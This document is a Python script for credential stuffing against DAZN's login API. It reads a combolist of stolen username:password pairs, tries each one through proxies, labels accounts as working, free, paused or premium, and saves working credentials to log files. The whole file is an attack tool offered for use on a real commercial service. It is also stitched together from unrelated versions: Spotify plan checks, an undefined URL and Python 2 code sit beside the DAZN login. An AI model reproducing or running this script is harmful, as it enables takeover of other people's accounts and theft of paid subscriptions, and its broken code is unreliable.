#!/usr/bin/python
# -*- coding: utf-8 -*-
"""checker.py: A script for automatize the procedure of checking accounts

Requirements:
    pip install bs4
    pip install schedule #opt
"""

from stem import Signal  # to control tor server
from stem.control import Controller
import time
import base64
#import schedule
import datetime
import sys
import requests
import urllib.parse
import json
from bs4 import BeautifulSoup  # A wonderful module for HTML parsing
# import json

def hilite(string, status=False, bold=False):
    """If tty highligth the output (red/green color)."""

    if not sys.stdout.isatty():
        return string
    attr = []
    if status:
        attr.append('32')  # Green
    else:
        attr.append('31')  # Red
    if bold:
        attr.append('1')
    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

def load_config(current_session):
    # Get login data from file
    current_session['start'] = datetime.datetime.now()  # set the start time
    current_session['config'] = {}
    current_session['config']['proxy'] = []
    current_session['config']['others'] = []
    current_session['config']['timeout'] = 6
    #TODO fopen check
    f_proxy = open("proxy.txt", 'r')
    #delimiter = input("Delimiter char used in combos?[,|:;]")
    for line in f_proxy.readlines():
        ip, port = line.rstrip().split(":", 1)
        port = port.split(' ', 1)[-1]  # Remove all after first space ip:port -somecommentuknow
        proxy = {'https': 'https://'+ip+":"+port,
                'http': 'https://'+ip+":"+port
                }
        # Add also socks4/5 to autocheck
        current_session["config"]["proxy"].append(proxy)
    return current_session
    

def try_login(username, password, session_config):

    url_0 = 'https://www.dazn.com/it-IT/account/signin'
    url_1 = 'https://isl-eu.dazn.com/misl/eu/v4/SignIn'
    # Start a new session, to preserve the cookie
    global s
    s = requests.session()
    #s.proxies = proxy
    timeout = session_config['config']['timeout']
    # Take session and anti-csrf Token
    #TOEDIT 1 !!!!
    first_request_header = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'DNT': '1',
        'Origin': 'https://www.dazn.com',
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
        'Accept-Language': 'it-IT'
        }
    t = s.get(url_0, timeout=timeout, headers=first_request_header)
    auth_url = s.cookies.get_dict().get("UI.uuid")  # CSRF in cookie ex.0064B08D31
    # print("Got CSRF token:" + auth_url)
    # The login POST payload
    login_payload = {
         'Email': username,
        'Password': password,
        'DeviceId': str(auth_url)+"B",
        'Platform': "web"
    }
    # Need to avoid b'string' with base64encode
    login_headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
        # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language' : 'it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding' : 'gzip, deflate, br',
        'Referer': 'https://www.dazn.com/it-IT/account/signin',
        'X-Requested-With': 'XMLHttpRequest',
        'Upgrade-Insecure-Requests' : '1',
        'Origin': 'https://www.dazn.com',
        #'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Type': 'application/json',
        'Content-Length' : str(len(urllib.parse.urlencode(login_payload))),
        #'Cookie' : 'spot={"t":1516389866,"m":"it","p":null}; sp_t=77022c91543ca0fb030c694ed847a98b; sp_new=1; __bon='+str(bon_cookie)+'; _ga=GA1.2.1199860444.1516389870; _gid=GA1.2.198396770.1516389870; _gat=1;fb_continue=; __tdev=VV4fjDj7; __tvis=BGWgw2Xk; spot=; csrf_token='+auth_url+'; remember='+username,
        'Connection': 'keep-alive',
    }

    try:
        l_response = s.post(url_1, json=login_payload, headers=login_headers)# data=login_payload,
        # vote_response = s.post(url, data=vote_payload, headers=vote_headers)
        json_dict = json.loads(l_response.text)
        print(l_response.text)
        error_login_key = "odata.error"  # KEy of json dict
        error_login_value = "Password"  # Value of error key
        if l_response and l_response.status_code == 200:
            if len(json_dict) > 0 and error_login_value in str(json_dict.get(error_login_key)["message"]["value"]):
                print((hilite("Account " + username + ":" + password + " is not working!")))
            elif len(json_dict) > 0 and "" in json_dict:
                # Check acccount info (2 urls for netflix, billing contains all needed infos)!
                time.sleep(0.1)
                overview = s.get(url_2)
                #Check for subscription infos
                soup = BeautifulSoup(overview.text)
                plan_subscription = soup.select("h3[class=product-name]")
                if len(plan_subscription) > 0 and "Free" in plan_subscription[0].text:
                    print((hilite("Account " + username + ":" + password + " is working (FREE :( )!")))
                elif len(plan_subscription) > 0 and "Premium paused" in plan_subscription[0].text:
                    print((hilite("Account " + username + ":" + password + " is working (PAUSED :( )!")))
                elif len(plan_subscription) > 0 and "Spotify Premium" in plan_subscription[0].text:
                    print((hilite("Account " + username + ":" + password + " is working (Premium! :D )!", True)))
                    renewal_date = soup.select("b[class=recurring-date]")[0].text
                    plan = "Premium"
                    print(hilite("Renewal date:"+renewal_date))
                    fw = "logSpotify.txt"
                    with open(fw, "a+") as log:
                        log.write(username+":"+password+"|" + renewal_date + "|" + plan +"\n")
                elif len(plan_subscription) > 0 and "Premium for Family" in plan_subscription[0].text:
                    print((hilite("Account " + username + ":" + password + " is working (FAMILY Premium! :D )!", True)))
                    plan = "Premium for Family"
                    try:
                        renewal_date = soup.select("b[class=recurring-date]")[0].text
                        print(hilite("Renewal date:"+renewal_date))
                    except Exception:
                        renewal_date = "Uknown"
                    fw = "logSpotify.txt"
                    with open(fw, "a+") as log:
                        log.write(username+":"+password+"|" + renewal_date + "|" + plan +"\n")
                else:
                    #print(overview.text)
                    error_selector = soup.select("p[class=lead]")
                    if len(error_selector) > 0 and "Refresh this page or try again" in error_selector[0].text:
                        #Need to retry
                        print("Retrying, something went wrong")
                        try_login(username, password, session_config)
                    print("Uknown data")
        else:
            if len(json_dict) > 0 and error_login_value in str(json_dict.get(error_login_key)["message"]["value"]):
                print((hilite("Account " + username + ":" + password + " is not working!")))
            else:
                print(hilite("Error:" + str(l_response.status_code)))
                print(hilite("From api:" + "\n" + str(json_dict.get(error_login_key))))
    except Exception as e:
        print(hilite("! Login failed for " + username))
        fw = "logManualCheckSpotify.txt"
        with open(fw, "a+") as log:
            log.write(username+":"+password +"\n")
        #print(l_response.text[:5640])
        print(e)
        #raise(e)


def main():
    # Get login data from file
    current_session = {}
    current_session = load_config(current_session)
    try:
        # Some configuration infos
        fname = input("Combolist file name?")
        f = open(fname, 'r')
        delimiter = input("Delimiter char used in combos?[,|:;]")
        line_index = 0
        combo_list = f.readlines()
        while line_index < len(combo_list):
            line = combo_list[line_index]
            #print("Read from file:" + line)
            if not line or line.startswith("#") or len(line) < 4:  # line is blank or a comment
                continue
            user, password = line.rstrip().split(delimiter, maxsplit=1)
            try:
                try_login(user, password, current_session)
                #print(line_index)
                time.sleep(3)
                line_index += 1
            except requests.exceptions.RequestException:
                # Proxy KO
                # Change proxy next iteration 
                #current_session["config"]["changeProxyFlag"] = True
                print(hilite("Something went wrong, retrying. " + "\n"))
                continue

        print ("End of cracking:", str(datetime.date.today()))
    except ValueError:
        print(hilite("Check the format of your accounts.txt! It should be like:\nusername:password<cr>"))
        print("The script will try to go on in case of:\na)A blank line\nb)a comment (#) line\nPress CTRL+C to exit")
    except KeyboardInterrupt:
        print(hilite("[Closing the resource, shutdown the network module... WAIT]"))
    except Exception as e:
        print(hilite("Unhelded exception, exiting.." + str(e)))


def main2():
    # Get login data from file
    f = file("accounts.txt", 'r')
    f2 = file("pswd.txt", 'r')
    for line in f.readlines():
        user, password = line.rstrip().split(":")
        for line in f2.readlines():
            try_login(user, line.strip())
            time.sleep(3)

main()

